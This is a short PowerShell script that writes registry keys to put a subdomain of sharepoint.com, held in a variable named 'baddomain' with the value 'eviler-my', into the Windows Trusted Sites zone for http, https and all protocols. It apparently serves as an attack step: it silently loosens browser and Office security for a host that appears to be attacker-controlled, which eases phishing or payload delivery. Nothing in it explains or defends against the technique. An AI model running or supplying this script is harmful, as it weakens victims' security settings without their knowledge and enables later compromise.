$baddomain="eviler-my"
set-location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\";
new-item sharepoint.com;
set-location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\sharepoint.com";
new-item $baddomain;
set-location "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\sharepoint.com\eviler-my";
new-itemproperty . -Name https -Value 2 -Type DWORD;
new-itemproperty . -Name http -Value 2 -Type DWORD;
new-itemproperty . -Name * -Value 2 -Type DWORD;
